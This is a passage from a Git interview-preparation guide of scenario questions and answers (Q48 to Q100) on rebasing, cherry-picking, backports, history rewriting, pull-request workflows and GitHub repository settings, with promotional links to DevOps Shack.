2. Otherwise: `git reset --hard HEAD^1`, which moves back to the first parent.
3. Check with `git log --oneline --graph -5`.

**Why →** The merge is only a commit on your local branch, and nobody else has it.

**Interview tip →** If already pushed, use `git revert -m 1` instead.

</details>

### Q49. A bug fix commit on `main` must be reverted from `release/3.0`, but later commits touched the same lines. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** A plain revert will conflict because the surrounding code changed.

**What I'd do →**
1. `git switch release/3.0 && git revert <sha>`.
2. Resolve conflicts using `zdiff3` markers, comparing against the original commit's diff: `git show <sha>`.
3. If dependent commits are required, decide: revert those too, or fix forward with a targeted patch.
4. Run the release test suite, then open a PR to the release branch.

**Why →** Revert is a reverse cherry-pick, so it is only as clean as the surrounding context.

**Interview tip →** Say you would ask whether the release needs the revert at all, or a smaller targeted fix.

</details>

### Q50. You dropped a stash entry accidentally and need it back. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** A dropped stash is an unreachable commit; Git printed its SHA when you dropped or popped it.

**What I'd do →**
1. If you saw `Dropped refs/stash@{0} (abc123...)`, run `git stash apply abc123`.
2. Otherwise search dangling commits:

```bash
git fsck --no-reflogs --unreachable | awk '/commit/ {print $3}' \
  | xargs git log --no-walk --format='%h %ad %s' --date=short
```

3. Look for "WIP on <branch>" messages and apply the right one with `git stash apply <sha>`.

**Why →** A stash is a merge commit with two or three parents; it stays until pruned.

**Interview tip →** Do this fast, and avoid running `git gc`.

</details>

## Rebase, Cherry-pick and History Rewriting

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q51. Your PR branch has ten commits like "wip", "fix typo", "oops". How do you clean it up before review? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Private, unreviewed history can be rewritten. Reviewers want a readable story.

**What I'd do →**
1. `git rebase -i origin/main`.
2. Keep the first meaningful commit as `pick`; change the noise commits to `squash` (merge messages) or `fixup` (discard messages).
3. Rewrite the final messages in the editor.
4. `git push --force-with-lease`.

**Why →** One logical commit per change makes review, bisect and revert simple.

**Interview tip →** Say you only rewrite commits nobody else has based work on.

</details>

### Q52. You want the database migration commit to come before the code that uses it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Commit order is wrong, though the tree content is fine.

**What I'd do →**
1. `git rebase -i HEAD~5`.
2. Move the `pick` line for the migration above the dependent commit.
3. Resolve conflicts if both touch the same files, then `git rebase --continue`.
4. Run tests at each step: `git rebase -i --exec "make test" HEAD~5`.

**Why →** Each commit should build and pass tests on its own, so bisect stays reliable.

**Interview tip →** Reordering conflicts are a sign that the commits are not truly independent.

</details>

### Q53. A critical fix on `main` must go to the `release/4.1` branch only. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** You need one commit, not a merge of all of `main`.

**What I'd do →**
1. `git switch release/4.1`.
2. `git cherry-pick -x <sha>`.
3. Run the release pipeline, then push or open a PR.

**Why →** Cherry-pick re-applies the diff as a new commit; `-x` records the original SHA in the message for traceability.

**Interview tip →** Fix on `main` first so the fix is never lost in the next release.

</details>

### Q54. You must backport a feature made of 6 commits, including one merge commit. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Cherry-pick of a merge commit needs a mainline choice, and ranges skip merges by default.

**What I'd do →**
1. For plain commits: `git cherry-pick -x A^..F`.
2. For a merge commit: `git cherry-pick -m 1 <merge-sha>` applies the diff against the first parent.
3. Often simpler: cherry-pick the single squash commit if the PR was squashed.
4. If it stalls: fix, `git add`, `git cherry-pick --continue`, or `--abort`.

**Why →** A merge has no single diff; `-m` chooses which parent to diff against.

**Interview tip →** Squash-merged PRs make backports one-liners.

</details>

### Q55. Branch B was built on top of branch A. A was squash-merged into `main`, and now B shows A's commits again. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The squash commit has new content ancestry, so Git cannot tell A's old commits are already in `main`.

**What I'd do →**
1. Note A's last commit: `git log --oneline A`.
2. Replay only B's own commits:

```bash
git fetch origin
git rebase --onto origin/main <A-tip-sha> B
git push --force-with-lease
```

3. The PR now contains only B's changes.

**Why →** `--onto` takes the range `A-tip..B` and replants it on `main`.

**Interview tip →** This is the daily pain of stacked branches with squash merging.

</details>

### Q56. During review you get ten small change requests on old commits. How do you apply them cleanly? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** You want fixes folded into the right commits, not a pile of "address review" commits.

**What I'd do →**
1. For each fix: `git add -p && git commit --fixup <target-sha>`.
2. When done: `git rebase -i --autosquash origin/main`.
3. Enable permanently: `git config --global rebase.autoSquash true`.
4. Push with `--force-with-lease`; mention it in the PR so reviewers re-check.

**Why →** Fixup commits are auto-ordered and squashed, so history reads as if the code was right the first time.

**Interview tip →** Some teams prefer review fixup commits until approval to ease re-review. Know both.

</details>

### Q57. During a rebase, "ours" and "theirs" seem backwards. Why? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Rebase replays your commits onto the target, so Git checks out the target and applies your commits one by one.

**What I'd do →**
1. Remember: during rebase, "ours" is the branch being rebased onto (upstream), "theirs" is your commit being replayed.
2. To keep your change: `git checkout --theirs file`.
3. To keep upstream's version: `git checkout --ours file`.
4. `git add file && git rebase --continue`.

**Why →** Git's internal "current branch" is the detached rebase target, so the labels flip compared to merge.

**Interview tip →** A good interviewer answer: "I avoid the words and read the diff instead".

</details>

### Q58. A commit from three days ago should never have been made. How do you remove it from your private branch? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The commit is in the middle of history and unshared.

**What I'd do →**
1. `git rebase -i <bad-sha>^`.
2. Change `pick` to `drop` on that line (or delete it).
3. Resolve conflicts from later commits that depended on it.
4. `git push --force-with-lease`.

**Why →** Rebase replays everything except the dropped commit. If the branch is shared, use `git revert` instead.

**Interview tip →** Ask whether anyone else has the branch before dropping anything.

</details>

### Q59. You committed for a month with the wrong email address. How do you fix authorship? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Commits carry author and committer identity that you can rewrite only by creating new commits.

**What I'd do →**
1. Fix config: `git config user.email "me@company.com"`.
2. Unpushed or private branch: `git rebase -r --root --exec 'git commit --amend --no-edit --reset-author'`.
3. Whole repo with a mapping: use `git filter-repo --mailmap mailmap.txt`.
4. Force-push, and warn collaborators to re-clone.

**Why →** Identity is part of the commit hash, so changing it changes every descendant SHA.

**Interview tip →** For display-only fixes, a `.mailmap` file changes `git log` and `shortlog` output without rewriting history.

</details>

### Q60. You want to rebase a branch that contains merge commits without flattening them. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Default rebase drops merge commits and linearises the commits.

**What I'd do →**
1. `git rebase --rebase-merges origin/main` (`-r`) recreates the merge topology.
2. Check the todo list: it shows `label`, `reset`, `merge` commands.
3. Resolve conflicts inside the rebuilt merges as they appear.
4. Compare afterwards: `git range-diff origin/main@{1}...HEAD`.

**Why →** `--rebase-merges` replaces the old `--preserve-merges`, which was removed because it handled interactive edits badly.

**Interview tip →** `git range-diff` shows what really changed between two versions of a rewritten branch.

</details>

### Q61. You rebased and force-pushed a branch your teammate also had checked out. What does he do now? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** His local branch has the old commits, the remote has new ones. A normal `git pull` will merge both and duplicate commits.

**What I'd do →**
1. If he has no local commits: `git fetch && git reset --hard origin/feature`.
2. If he has local commits: `git rebase --onto origin/feature <old-remote-tip> feature`, where the old tip comes from `git reflog show origin/feature`.
3. Or `git pull --rebase`, which uses the fork-point to drop the duplicates automatically.

**Why →** Git needs to know which of his commits are already rewritten upstream. Fork-point detection uses the reflog.

**Interview tip →** Better still: announce before rewriting shared branches, or avoid doing it.

</details>

### Q62. You rebased 12 commits and want to be sure every commit still builds. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Rebase can leave intermediate commits broken even if the tip works.

**What I'd do →**
1. `git rebase -i --exec "make build && make test" origin/main`.
2. Rebase stops at the first failing commit; fix it, `git commit --amend`, then `git rebase --continue`.
3. For a CI check, run each commit: `git rebase --exec "./ci.sh" origin/main`.

**Why →** Every commit being green keeps `git bisect` trustworthy.

**Interview tip →** Linux-style projects require "bisectable" series. Mention this as the reason.

</details>

### Q63. The repo is slow to clone because someone committed a 1 GB dataset two years ago and deleted it later. How do you shrink it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Deleting a file in a later commit leaves it in history forever.

**What I'd do →**
1. Find big blobs: `git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' | sort -k3 -n -r | head`.
2. On a fresh mirror clone: `git filter-repo --path data/big.csv --invert-paths`.
3. Force-push all refs, then have everyone re-clone.
4. Ask GitHub Support to run garbage collection on cached views if needed.

**Why →** Only rewriting history removes the blob, and that changes SHAs for everything after it.

**Interview tip →** Plan the re-clone communication. Open PRs will have to be recreated.

</details>

### Q64. An older commit message is poor and the branch is private. How do you reword it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Only the message of a past commit needs to change.

**What I'd do →**
1. `git rebase -i HEAD~6`.
2. Change `pick` to `reword` for the target commit.
3. Save, then edit the message in the editor that opens.
4. `git push --force-with-lease` if the branch was pushed.

**Why →** Reword replays that commit with a new message and updates descendants.

**Interview tip →** For only the last commit, `git commit --amend` is enough.

</details>

### Q65. Your history is full of "Merge branch 'main' into feature" noise from `git pull`. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Plain `git pull` merges upstream into your local commits, creating a merge commit each time.

**What I'd do →**
1. `git config --global pull.rebase true` makes pull replay your commits on top.
2. Or `git config --global pull.ff only` to refuse non-fast-forward pulls and decide consciously.
3. Fix an existing branch with `git rebase origin/main`.

**Why →** Rebase keeps local work on top of upstream, giving a linear branch.

**Interview tip →** Newer Git warns until you set `pull.rebase`, so setting it is part of a good global config.

</details>

### Q66. A cherry-pick hits conflicts and you are unsure about it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The target branch has diverged from where the commit was made.

**What I'd do →**
1. `git status` shows the conflicted files; look at what the commit intended with `git show <sha>`.
2. Resolve, `git add`, then `git cherry-pick --continue`.
3. If it is too different: `git cherry-pick --abort` and ask whether a manual port is better.

**Why →** Cherry-pick is a three-way merge using the commit's parent as the base.

**Interview tip →** Heavy conflicts usually mean the fix needs a manual backport, not a mechanical one.

</details>

### Q67. You backported fixes by cherry-pick and now want to know which commits on `main` are still missing from `release/5.0`. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** SHAs differ after cherry-picks, so normal log ranges lie.

**What I'd do →**
1. `git cherry -v release/5.0 main` lists commits on `main` with `+` (not in release) or `-` (equivalent patch present).
2. Or `git log --oneline --cherry-pick --right-only release/5.0...main`.
3. Review the `+` list and decide what to backport.

**Why →** Both commands compare patch-ids (a hash of the diff), not commit SHAs.

**Interview tip →** Patch-id matching breaks if conflict resolution changed the diff, so spot check.

</details>

### Q68. You accidentally merged `main` into your feature branch three times and want a linear branch again. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Merge commits are cluttering a branch that should be a clean series.

**What I'd do →**
1. `git fetch origin`.
2. `git rebase origin/main` (without `-r`) drops the merges and replays only your own commits.
3. Resolve conflicts once per commit.
4. `git push --force-with-lease`.

**Why →** Default rebase ignores merge commits and picks the non-merge commits in the range.

**Interview tip →** If a merge itself had hand-resolved conflicts, check the final diff carefully, since that resolution may be lost.

</details>

### Q69. One service in the monorepo must become its own repo, with its history. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** You need only the commits that touched `services/billing`, with paths moved to the root.

**What I'd do →**
1. Fresh clone: `git clone --no-local monorepo billing && cd billing`.
2. `git filter-repo --subdirectory-filter services/billing`.
3. Add the new remote and push all branches and tags.
4. In the monorepo, remove the directory and point to the new repo (or add it as a submodule or package dependency).

**Why →** filter-repo rewrites quickly and keeps only relevant history. Never run it on your working clone.

**Interview tip →** Plan CI, issue transfer, and CODEOWNERS for the new repo as part of the split.

</details>

### Q70. You have stacked branches (A, B, C) and need to rebase the whole stack after A changes. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Rebasing only the top branch leaves A and B pointing at old commits.

**What I'd do →**
1. Check out the top branch C.
2. `git rebase -i --update-refs origin/main` (Git 2.38+); the todo list updates A and B pointers too.
3. Push all: `git push --force-with-lease origin A B C`.
4. Or use tooling such as `gh stack`-style helpers, Graphite or ghstack for larger stacks.

**Why →** `--update-refs` moves every branch whose tip is inside the rebased range.

**Interview tip →** Stacks keep PRs small but need discipline: merge bottom-up and retarget as you go.

</details>

### Q71. A rebase stops with "The previous cherry-pick is now empty". What do you do? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The commit's change is already present upstream (someone applied the same fix), so replaying it yields nothing.

**What I'd do →**
1. If it is truly a duplicate: `git rebase --skip`.
2. To handle this automatically: `git rebase --empty=drop origin/main`.
3. To keep it as an empty marker commit: `git commit --allow-empty` then continue.

**Why →** Git stops by default so you consciously confirm that nothing is lost.

**Interview tip →** Verify with `git diff HEAD` that the upstream content matches your intent before skipping.

</details>

### Q72. You must backport 15 commits to three old release branches. How do you make it repeatable? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Doing 45 cherry-picks by hand is error-prone.

**What I'd do →**
1. Collect the commits in order: `git rev-list --reverse --no-merges <range> > picks.txt`.
2. Script it per branch:

```bash
for br in release/3.8 release/3.9 release/4.0; do
  git switch -c "backport-$br" "origin/$br"
  xargs -n1 git cherry-pick -x < picks.txt || break
  git push origin "backport-$br"
  gh pr create --base "$br" --fill
done
```

3. Stop on the first conflict and fix by hand; let CI test each PR.
4. Prefer a bot (GitHub Action with labels such as `backport 4.0`) for the long run.

**Why →** Oldest-first order matters, since later commits assume earlier ones.

**Interview tip →** Mention using PR labels to trigger automated backports.

</details>

### Q73. Compliance asks that every commit on a release branch be signed. Many are not. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Signing requires rewriting commits, so this is only possible on unshared or new work.

**What I'd do →**
1. Configure signing first: `git config gpg.format ssh` and `user.signingkey`.
2. For a private branch: `git rebase --exec 'git commit --amend --no-edit -S' origin/main`.
3. For history already shared, do not rewrite. Instead, require signatures from now on via branch protection.
4. Verify: `git log --show-signature -5`.

**Why →** Signatures cover the commit content including parents, so retroactive signing changes every SHA.

**Interview tip →** Rewriting released history breaks tags and downstream references, so policy goes forward only.

</details>

### Q74. You committed to `feature-a` but the commit belongs on `feature-b`, and `feature-a` has other commits after it. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** One commit is in the wrong place in the middle of unpushed history.

**What I'd do →**
1. `git switch feature-b && git cherry-pick <sha>`.
2. Back on `feature-a`: `git rebase -i <sha>^` and `drop` the commit.
3. Resolve conflicts if later commits relied on it.

**Why →** Cherry-pick copies it to the right branch, and rebase removes the original.

**Interview tip →** If the branches are pushed and shared, revert instead of dropping.

</details>

### Q75. You have a 60-commit branch full of experiments and need a reviewable PR. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The final tree is good but the history is unreadable.

**What I'd do →**
1. Keep a backup: `git branch experiment-backup`.
2. `git reset --soft $(git merge-base origin/main HEAD)` collapses everything into staged changes.
3. Re-commit in logical pieces using `git add -p`: schema, core logic, API, tests, docs.
4. Force-push the cleaned branch.

**Why →** You build the story you want reviewers to follow, with tests passing at each step.

**Interview tip →** Alternatively, offer several smaller PRs. Reviewers handle those much better.

</details>

## Remotes, Collaboration and Pull Requests

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q76. You are new to a team. How do you collaborate daily without stepping on others' toes? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The risk is stale branches and surprise conflicts.

**What I'd do →**
1. Start each task from fresh `main`: `git fetch && git switch -c feature/ABC-123 origin/main`.
2. Commit small and often; push early so CI and teammates see it.
3. Before opening a PR: `git fetch && git rebase origin/main`, run tests.
4. Never push directly to `main`; always use a PR.

**Why →** Short-lived branches have small diffs, so conflicts are smaller and rarer.

**Interview tip →** Say "fetch first, then decide merge or rebase", not blind `git pull`.

</details>

### Q77. You are migrating a repo from Bitbucket to GitHub and must keep every branch and tag. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** A normal clone only fetches some refs as local branches. A mirror copies everything.

**What I'd do →**
1. `git clone --mirror git@bitbucket.org:org/app.git && cd app.git`.
2. Create the empty repo on GitHub, then `git push --mirror git@github.com:org/app.git`.
3. Large files above 100 MB will be rejected; convert them with `git lfs migrate import` first.
4. Update CI, webhooks and local remotes: `git remote set-url origin ...`.

**Why →** `--mirror` copies all refs exactly, including remote branches and notes.

**Interview tip →** Pull requests and issues do not travel with Git; use the GitHub Importer or API tools.

</details>

### Q78. You want to contribute a fix to an open-source project you do not have write access to. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The standard path is fork, branch, pull request.

**What I'd do →**
1. Fork on GitHub: `gh repo fork OWNER/REPO --clone`.
2. `git switch -c fix/typo-in-readme`.
3. Commit following the project's `CONTRIBUTING.md` (sign-off, tests, style).
4. `git push -u origin fix/typo-in-readme`, then `gh pr create`.

**Why →** You push to your fork and the PR proposes the merge into the upstream repo.

**Interview tip →** Read the contribution guide and open an issue first for larger changes.

</details>

### Q79. A teammate sent a 3,000-line PR and nobody can review it properly. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Review quality drops sharply above a few hundred lines.

**What I'd do →**
1. Ask the author to split it along natural seams: refactor, schema, feature, tests.
2. Land mechanical changes (renames, moves, formatting) first as separate PRs.
3. Use feature flags to merge incomplete work safely behind a switch.
4. Set up a PR size label or a soft limit in CI to nudge future PRs.

**Why →** Small PRs get faster, deeper review and are easier to revert.

**Interview tip →** Offer to pair with the author on the split, which keeps the tone constructive.

</details>

### Q80. A reviewer asks for changes. How do you update the PR cleanly? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The PR updates automatically when you push to its branch.

**What I'd do →**
1. Make the changes locally and commit them.
2. `git push` (no force needed for plain commits).
3. Reply to each comment and resolve threads you have addressed.
4. Re-request review using the "Re-request" icon.

**Why →** New commits show up in the PR timeline, so reviewers can see what changed since their review.

**Interview tip →** Avoid force-pushing mid-review unless the team agreed, since it can hide incremental changes.

</details>

### Q81. Your team wants stacked PRs so that large work arrives in small reviewable steps. How do you set it up? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Each PR depends on the one below, so base branches and merge order matter.

**What I'd do →**
1. Branch chain: `feat-1` from `main`, `feat-2` from `feat-1`, `feat-3` from `feat-2`.
2. PR bases: `feat-1 → main`, `feat-2 → feat-1`, `feat-3 → feat-2`.
3. Merge bottom-up. When the base branch is deleted after merging, GitHub retargets the next PR to `main`.
4. Rebase upstream branches with `git rebase --update-refs` after changes or squash merges.
5. Consider tooling (Graphite, ghstack, git-branchless) when stacks are common.

**Why →** Reviewers see only a small diff per PR, even though the work is large.

**Interview tip →** Squash merging forces `rebase --onto` for the next layer, so mention it.

</details>

### Q82. Why do you use `--force-with-lease`, and when does it still hurt? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** After rebasing, you must overwrite the remote branch, but you want protection against deleting a teammate's new commits.

**What I'd do →**
1. `git push --force-with-lease origin feature`.
2. Pin the expected tip for more safety: `--force-with-lease=feature:<sha>`; add `--force-if-includes` (Git 2.30+).
3. Avoid running `git fetch` in the background (IDE auto-fetch) before pushing, because that updates the remote-tracking ref and defeats the lease check.

**Why →** The push only succeeds if the remote ref still equals what you last saw.

**Interview tip →** Plain `--force` never checks anything, so ban it on shared branches.

</details>

### Q83. Management wants the default branch renamed from `master` to `main` without breaking everyone. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Clones, CI, deployment scripts and PRs all reference the name.

**What I'd do →**
1. Rename in GitHub: Settings → Branches, or `gh api -X POST repos/ORG/REPO/branches/master/rename -f new_name=main`. Open PRs retarget and GitHub redirects some operations.
2. Search the repo for hard-coded names in CI files, Dockerfiles and docs.
3. Each developer runs:

```bash
git branch -m master main
git fetch origin
git branch -u origin/main main
git remote set-head origin -a
```

4. Update branch protection rules and deployment triggers.

**Why →** The server rename is easy; the long tail is automation referring to the old name.

**Interview tip →** Announce a date and keep a checklist.

</details>

### Q84. The organisation renamed, and your remote URL is now stale. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** GitHub redirects old URLs for a while, but you should update.

**What I'd do →**
1. `git remote -v` to confirm the current URL.
2. `git remote set-url origin git@github.com:new-org/app.git`.
3. `git fetch` to verify connectivity.
4. Update CI secrets, submodule URLs (`.gitmodules`) and package references.

**Why →** Redirects break if a new repo is created with the old name.

**Interview tip →** Check `.gitmodules` and then run `git submodule sync`.

</details>

### Q85. A colleague pushed `feature/search` and you want to work on it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** You only have a remote-tracking ref until you create a local branch.

**What I'd do →**
1. `git fetch origin`.
2. `git switch feature/search` (Git DWIMs a tracking branch when the name matches exactly one remote).
3. Or explicitly: `git switch -c feature/search --track origin/feature/search`.
4. Confirm with `git branch -vv`.

**Why →** A tracking branch lets `git pull` and `git push` know their default target.

**Interview tip →** Talk to your colleague before pushing to their branch.

</details>

### Q86. A CI job clones a 10 GB repo on every run and takes 8 minutes. How do you speed it up? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** CI rarely needs full history.

**What I'd do →**
1. Shallow clone: `git clone --depth 1 --branch main URL`. In GitHub Actions, `actions/checkout` defaults to `fetch-depth: 1`.
2. Skip file contents until needed: `git clone --filter=blob:none` (partial clone).
3. Limit the tree with `git sparse-checkout set services/api`.
4. Cache the repo between runs on persistent runners.

**Why →** Less data transferred means less time. Only jobs that need history (changelogs, `git describe`, bisect) set `fetch-depth: 0`.

**Interview tip →** Mention the blob-less partial clone for large monorepos.

</details>

### Q87. You want to test a colleague's PR on your machine. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** You need the PR's branch locally, even if it comes from a fork.

**What I'd do →**
1. `gh pr checkout 482`.
2. Without gh: `git fetch origin pull/482/head:pr-482 && git switch pr-482`.
3. Run tests and review with real tooling.
4. Delete the branch afterwards: `git branch -D pr-482`.

**Why →** GitHub exposes every PR at `refs/pull/<n>/head`, regardless of origin.

**Interview tip →** `refs/pull/<n>/merge` shows the tentative merge result with the base branch.

</details>

### Q88. Two developers need to work on the same feature branch simultaneously. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Shared branches need tight rules to avoid rewrite pain.

**What I'd do →**
1. Agree: no rebase or force-push on the shared branch.
2. Both run `git pull --rebase` before each push (rebases only local unpushed commits).
3. Split by file or module to reduce conflicts, and commit small.
4. Alternative: each dev uses a personal branch off the feature branch and PRs into it.

**Why →** Rebasing only your unpushed commits is safe, and rewriting published ones is not.

**Interview tip →** Personal sub-branches are the cleanest answer.

</details>

### Q89. An outside contributor's PR from a fork should run CI, but your workflow needs secrets. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Secrets are not passed to workflows triggered by fork PRs, for good reason: the fork's code is untrusted.

**What I'd do →**
1. Keep `pull_request` for tests that need no secrets. Fork PRs get a read-only token.
2. For label or comment automation, use `pull_request_target` only if you never check out or run PR code with it.
3. Require approval for first-time contributors (Settings → Actions → Fork pull request workflows).
4. For real integration tests, a maintainer pushes the contributor's commit to a branch in the main repo after review.

**Why →** `pull_request_target` runs in the base repo's context with secrets. Running untrusted code there is a well-known compromise path.

**Interview tip →** Name "pwn request" as the risk. It signals real security awareness.

</details>

### Q90. Two engineers pair-programmed and you want both credited on the commit. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** A commit has one author but can credit others with trailers.

**What I'd do →**
1. Add a trailer at the end of the message, after a blank line:

```text
Add retry to webhook sender

Co-authored-by: Priya Sharma <priya@example.com>
```

2. Use an email linked to their GitHub account so the avatar shows.
3. On squash merges, GitHub keeps these trailers in the final commit message.

**Why →** GitHub parses `Co-authored-by` and credits both in the UI and contribution graph.

**Interview tip →** Verify the trailer survives when the squash message is edited.

</details>

### Q91. A PR was merged into the wrong base branch (`develop` instead of `main`). 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The change is live in the wrong place and may already trigger a deploy.

**What I'd do →**
1. If `develop` is shared: `git revert -m 1 <merge-sha>` (or revert the squash commit) and push.
2. Open the correct PR against `main` from the original branch.
3. If the revert then blocks the re-merge, revert the revert when you want it back on `develop`.
4. Check what deployments ran and roll back if needed.

**Why →** Reverting keeps the shared history intact and avoids force-pushes.

**Interview tip →** Prevention: restrict who can change PR base, and protect both branches.

</details>

### Q92. `main` is busy, and PRs that passed CI break `main` after merging because of semantic conflicts. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Each PR was tested against an older `main`, not the real post-merge state.

**What I'd do →**
1. Enable the GitHub merge queue on `main`. It builds each PR on top of the queue ahead of it.
2. Add `merge_group` as a trigger to the CI workflow, otherwise the queue never gets results.

```yaml
on:
  pull_request:
  merge_group:
```

3. Set required status checks to those jobs; tune batch size and timeout.
4. Fallback without a queue: "Require branches to be up to date before merging".

**Why →** The queue tests exactly what will land, in the order it will land.

**Interview tip →** "Up to date" requirement forces serial rebases; the merge queue scales better.

</details>

### Q93. How do you make sure the right people review changes to payments code? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Review ownership must be automatic, not a convention.

**What I'd do →**
1. Add `.github/CODEOWNERS`:

```text
/services/payments/   @acme/payments-team
*.tf                  @acme/platform
```

2. Turn on "Require review from Code Owners" in branch protection.
3. Make owners teams, not individuals, to survive vacations and departures.
4. Use draft PRs while work is in progress to avoid early review requests.

**Why →** The rule is enforced at merge time, so ownership cannot be skipped.

**Interview tip →** Later patterns override earlier ones in CODEOWNERS; order matters.

</details>

### Q94. An external contributor's PR has conflicts, but they are unresponsive. What do you do as a maintainer? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The change is valuable but stuck.

**What I'd do →**
1. If "Allow edits by maintainers" is on, check out the PR with `gh pr checkout <n>`.
2. `git fetch origin && git rebase origin/main` (or merge), resolve conflicts and test.
3. `git push` to the contributor's branch; the PR updates and keeps their authorship.
4. If edits are disabled, re-create the work on your branch and keep their commits with `Co-authored-by`.

**Why →** Preserving authorship respects the contributor and keeps the contribution history honest.

**Interview tip →** Thank them in the PR; it matters for open-source community health.

</details>

### Q95. You want a PR merge to close an issue automatically. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** GitHub supports closing keywords.

**What I'd do →**
1. In the PR description or a commit message, write `Closes #231` (also `Fixes`, `Resolves`).
2. Use `Closes ORG/REPO#231` for another repo.
3. Merge into the default branch; the issue closes automatically.
4. Or link manually in the PR's Development sidebar.

**Why →** Closing keywords only fire when the PR targets the default branch.

**Interview tip →** For release branches, close issues manually or via workflow.

</details>

### Q96. After a PR merged and the branch was deleted on GitHub, `git pull` complains about your branch. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Your local branch tracks a remote branch that no longer exists (`[gone]`).

**What I'd do →**
1. `git fetch --prune` clears the stale remote-tracking ref.
2. `git branch -vv` shows branches marked `: gone]`.
3. Delete them: `git branch -D old-feature`.
4. Set `git config --global fetch.prune true`.

**Why →** Git never deletes remote-tracking refs unless asked.

**Interview tip →** A one-liner to clean all gone branches is useful, but check the list first.

</details>

### Q97. A new developer joins. What Git setup do you walk them through on day one? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Good defaults prevent a pile of avoidable mistakes.

**What I'd do →**
1. Identity: `git config --global user.name` and `user.email` matching their GitHub account.
2. Auth: SSH key or `gh auth login`; add the key to GitHub.
3. Sane defaults: `init.defaultBranch main`, `pull.rebase true`, `fetch.prune true`, `rerere.enabled true`.
4. Commit signing, editor, and the team's PR template and branching rules.
5. Clone and run the repo's bootstrap script (hooks installed by `pre-commit install` or similar).

**Why →** Identical defaults across the team means fewer "works on my machine" Git problems.

**Interview tip →** Keep this in an onboarding doc in the repo, not in people's heads.

</details>

### Q98. You use a personal and a work GitHub account on one laptop. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** SSH picks the first matching key, which authenticates as the wrong user.

**What I'd do →**
1. Create two keys and add each to its own account.
2. In `~/.ssh/config`:

```text
Host github-work
  HostName github.com
  User git
  IdentityFile ~/.ssh/id_ed25519_work
  IdentitiesOnly yes
```

3. Clone with `git@github-work:ORG/repo.git`.
4. Set the email per directory with `includeIf "gitdir:~/work/"` in `~/.gitconfig`.

**Why →** The alias selects the key, and `IdentitiesOnly` stops the agent from offering others.

**Interview tip →** `includeIf` avoids committing work code with your personal email.

</details>

### Q99. PR #2 was based on PR #1's branch, and #1 has just been merged. What happens to #2? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** PR #2's base branch may disappear, so GitHub must decide where it points.

**What I'd do →**
1. If "delete branch on merge" is on, GitHub retargets #2 to the base of #1 (usually `main`).
2. If #1 was squashed, rebase: `git rebase --onto origin/main <old-#1-tip> feature-2`.
3. Force-push with lease and check the diff only contains #2's changes.
4. Re-run CI.

**Why →** Without the rebase, the squash commit and the original commits both look like changes.

**Interview tip →** Merge strategy affects stacked workflows; say that out loud.

</details>

### Q100. You are asked to create release notes for every release without hand-writing them. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** PR titles and labels already carry the info.

**What I'd do →**
1. Create a release with generated notes: `gh release create v2.4.0 --generate-notes`.
2. Customise grouping with `.github/release.yml`, categories by label (`feature`, `bug`, `breaking`).
3. Enforce labels on PRs with a workflow or a template.
